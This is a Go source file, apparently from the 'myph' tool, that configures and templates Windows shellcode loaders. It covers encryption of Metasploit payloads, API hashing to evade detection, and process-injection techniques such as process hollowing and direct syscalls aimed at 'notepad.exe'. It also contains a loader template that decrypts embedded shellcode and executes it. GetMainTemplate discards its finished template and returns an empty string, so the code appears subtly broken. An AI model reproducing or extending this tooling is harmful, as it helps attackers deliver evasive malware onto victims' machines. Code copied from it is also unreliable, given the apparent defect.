package cli

import (
	"errors"
	"fmt"
	"github.com/cmepw/myph/loaders"
	"github.com/cmepw/myph/tools"
	"os/exec"
	"strings"
)

// APIHashingConfig is stored in the Compilation profile and manages all things related to API-Hashing
type APIHashingConfig struct {
	IsEnabled bool
	Technique apiHashTechnique
}

// ProcessInjectionConfig stores all the information related to loading a Process Injection method
type ProcessInjectionConfig struct {
	SleepTime int       // sleep-time before triggering the execution
	Target    string    // TargetProcess
	Technique technique // shellcode-loading technique

	// TODO(djnn): add here ExecFunctionName && sleep-obfuscation method support
	// maybe this object should also keep in memory the Win32 dependencies so that they can be loaded by APIHashingConfig
}

// CompilationProfile stores the compilation configuration (OS, Arch, Enable API-hashing ? etc.)
type CompilationProfile struct {

	// Win32 API hashing config
	APIHashingConfig APIHashingConfig

	// shellcode encryption method
	ShellcodeEncryptionMethod encKind

	// Shellcode loading technique
	ShellcodeLoading ProcessInjectionConfig

	// OS-target (Windows / Linux / darwin ?) Will be set as GOOS before calling compilation
	OSTarget targetOS

	// Arch target (x64, amd64 ?) will be set as GOARCH before calling compilation
	ArchTarget targetArch

	// expected binary output
	ArtefactType outputType
}

// Options store the user-selected options for a loading run
type Options struct {

	// should debug logging be enabled ?
	WithDebug bool

	// Compilation configuration
	CompileConfig CompilationProfile

	// Output filename (without extension)
	OutFile string

	// Input raw file (expects a file with a bunch of raw bytes in it)
	InFile string
}

// DefaultOptions is what is loaded before cobra CLI going through lexer
func DefaultOptions() Options {
	opts := Options{
		OutFile:   "payload",
		InFile:    "msf.raw",
		WithDebug: false,
		CompileConfig: CompilationProfile{
			ArtefactType:              PE_EXE,
			ArchTarget:                AMD64,
			OSTarget:                  WINDOWS,
			ShellcodeEncryptionMethod: EncKindXOR,
			APIHashingConfig: APIHashingConfig{
				IsEnabled: false,
				Technique: DJB2,
			},
			ShellcodeLoading: ProcessInjectionConfig{
				SleepTime: 0,
				Target:    "notepad.exe",
				Technique: SYSCALL,
			},
		},
	}

	return opts
}

type outputType string
type targetArch string
type targetOS string
type apiHashTechnique string
type encKind string
type technique string

const (
	PE_EXE outputType = "exe"
	PE_DLL outputType = "dll"
	// TODO(djnn): PE_SHELLCODE outputType = "shellcode"

	WINDOWS targetOS = "windows"
	LINUX   targetOS = "linux"
	MACOS   targetOS = "darwin"

	AMD64 targetArch = "amd64"
	ARM64 targetArch = "arm64"
	I386  targetArch = "i386"

	DJB2   apiHashTechnique = "DJB2"
	SHA1   apiHashTechnique = "SHA1"
	SHA256 apiHashTechnique = "SHA256"
	SHA512 apiHashTechnique = "SHA512"

	EncKindAES encKind = "AES"
	EncKindXOR encKind = "XOR"
	EncKindBLF encKind = "blowfish"
	EncKindC20 encKind = "chacha20"

	CRT               technique = "CRT"
	CRTx              technique = "CRTx"
	ETWP              technique = "Etwp"
	SYSCALL           technique = "Syscall"
	SYSCALLTEST       technique = "SyscallTest"
	EnumTreeW         technique = "EnumTreeW"
	NtCreateThreadEx  technique = "NtCreateThreadEx"
	CreateFiber       technique = "CreateFiber"
	CreateThread      technique = "CreateThread"
	ProcessHollowing  technique = "ProcessHollowing"
	EnumCalendarInfoA technique = "EnumCalendarInfoA"
)

func (a *outputType) String() string {
	return string(*a)
}

func (a *outputType) Set(value string) error {
	err := validateString(value, []string{"exe", "dll"})
	if err != nil {
		return err
	}
	*a = outputType(value)
	return nil
}

func (o *targetOS) String() string {
	return string(*o)
}

func (o *targetArch) Set(value string) error {
	err := validateString(value, []string{"amd64", "arm64", "i386"})
	if err != nil {
		return err
	}
	*o = targetArch(value)
	return nil
}

func (a *targetArch) String() string {
	return string(*a)
}

func (a *targetOS) Set(v string) error {
	err := validateString(v, []string{"windows", "linux", "darwin"})
	if err != nil {
		return err
	}
	*a = targetOS(v)
	return nil
}

func (e *apiHashTechnique) String() string {
	return string(*e)
}

func (e *apiHashTechnique) Set(v string) error {
	err := validateString(v, []string{"DJB2", "SHA1", "SHA256", "SHA512"})
	if err != nil {
		return err
	}
	*e = apiHashTechnique(v)
	return nil
}

func (e *encKind) String() string {
	return string(*e)
}

func (e *encKind) Set(v string) error {
	return validateString(v, []string{"AES", "XOR", "blowfish", "chacha20"})
}

func (e *technique) String() string {
	return string(*e)
}

func (e *technique) Set(v string) error {
	err := validateString(
		v,
		[]string{
			"CRT",
			"CRTx",
			"Etwp",
			"Syscall",
			"CreateFiber",
			"NtCreateThreadEx",
			"EnumCalendarInfoA",
			"EnumTreeW",
			"ProcessHollowing",
			"CreateThread",
		},
	)
	if err != nil {
		return err
	}
	*e = technique(v)
	return nil
}

func validateString(v string, validStrings []string) error {
	for _, s := range validStrings {
		if v == s {
			return nil
		}
	}
	return errors.New("must be one of " + strings.Join(validStrings, "\", \""))
}

func (a *targetOS) Type() string {
	return "Target (windows, linux, darwin)"
}

func (a *targetArch) Type() string {
	return "Architecture (amd64, i386, arm64)"
}

func (o *outputType) Type() string {
	return "Target artefact binary type (exe, dll)"
}

func (e *apiHashTechnique) Type() string {
	return "API Hashing algorithm (DJB2, SHA1, SHA256, SHA512)"
}

func (e *encKind) Type() string {
	return "Algorithm (XOR, AES, blowfish, chacha20)"
}

func (e *technique) Type() string {
	return "Win32 (CRT, CRTx, CreateFiber, ProcessHollowing, CreateThread, NtCreateThreadEx, Etwp, Syscall, EnumTreeW, EnumCalendarInfoA)"
}

func (e encKind) Encrypt(shellcode []byte, key []byte, tempDirPath string) ([]byte, error) {
	switch e {
	case EncKindAES:
		return tools.EncryptAES(shellcode, key)
	case EncKindBLF:
		fmt.Println("[+] Downloading additional dependency (golang.org/x/crypto/blowfish)")
		execCmd := exec.Command("go", "get", "golang.org/x/crypto/blowfish")
		execCmd.Dir = tempDirPath

		_, err := execCmd.Output()
		if err != nil {
			return nil, err
		}
		return tools.EncryptBlowfish(shellcode, key)
	case EncKindXOR:
		return tools.EncryptXOR(shellcode, key)
	case EncKindC20:
		fmt.Println("[+] Downloading additional dependency (golang.org/x/crypto/chacha20poly1305)")
		execCmd := exec.Command("go", "get", "golang.org/x/crypto/chacha20poly1305")
		execCmd.Dir = tempDirPath
		_, err := execCmd.Output()
		if err != nil {
			return nil, err
		}
		return tools.EncryptChacha20(shellcode, key)
	}

	return nil, errors.New("unknown encryption algorithm")
}

func (e encKind) GetTemplate() string {
	switch e {
	case EncKindAES:
		return tools.GetAESTemplate()
	case EncKindBLF:
		return tools.GetBlowfishTemplate()
	case EncKindXOR:
		return tools.GetXORTemplate()
	case EncKindC20:
		return tools.GetChacha20Template()
	}
	return ""
}

func (c CompilationProfile) GetExecutionTemplate() (string, error) {
	var methods = map[technique]loaders.Templater{
		SYSCALL: loaders.SysTemplate{
			UseApiHashing: c.APIHashingConfig.IsEnabled,
			HashMethod:    string(c.APIHashingConfig.Technique),
		},
		CreateThread: loaders.CreateTTemplate{
			UseApiHashing: c.APIHashingConfig.IsEnabled,
			HashMethod:    string(c.APIHashingConfig.Technique),
		},
		NtCreateThreadEx: loaders.NtCreateThreadExTemplate{
			UseApiHashing: c.APIHashingConfig.IsEnabled,
			HashMethod:    string(c.APIHashingConfig.Technique),
		},
		CRT:               loaders.CRTTemplate{},
		CRTx:              loaders.CRTxTemplate{},
		ProcessHollowing:  loaders.ProcHollowTemplate{},
		EnumCalendarInfoA: loaders.EnumCalendarTemplate{},
		CreateFiber:       loaders.CreateFiberTemplate{},
		EnumTreeW:         loaders.EnumTreeW{},
	}

	if c.APIHashingConfig.IsEnabled {
		loaders.InformExperimental()
	}

	template, exist := methods[c.ShellcodeLoading.Technique]
	if !exist {
		return "", errors.New("unknown shellcode loading technique")
	}
	return template.GetTemplate(c.ShellcodeLoading.Target), nil
}

func (c CompilationProfile) GetMainTemplate(
	encodingType tools.BytesEncodingType,
	key string,
	shellcode string,
) string {

	encImport := "enc.StdEncoding"
	if string(encodingType) == "hex" {
		encImport = "enc"
	}

	exportStatement := `import "C"`
	mainStatement := `
func main() {}

//export entry
func entry() {
`

	if c.ArtefactType == PE_EXE {
		exportStatement = ""
		mainStatement = "func main() {"
	}

	template := `
package main 

import (
	"time"
	"os"
	enc "encoding/__ENCODING_IMPORT__"
)

__EXPORT_STATEMENT__
var Key = __KEY__
var Code = __CODE__

__MAIN_STATEMENT__
	decodedSc, _ := __ENCODING__.DecodeString(Code)
	decodedKey, _ := __ENCODING__.DecodeString(Key)

    decrypted, err := Decrypt(decodedSc, decodedKey)
    if err != nil {
        os.Exit(1)
    }

	ExecuteOrderSixtySix(decrypted)
}
`
	template = strings.ReplaceAll(template, "__ENCODING_IMPORT__", string(encodingType))
	template = strings.ReplaceAll(template, "__ENCODING__", encImport)
	template = strings.ReplaceAll(template, "__EXPORT_STATEMENT__", exportStatement)
	template = strings.ReplaceAll(template, "__MAIN_STATEMENT__", mainStatement)

	return ""
}
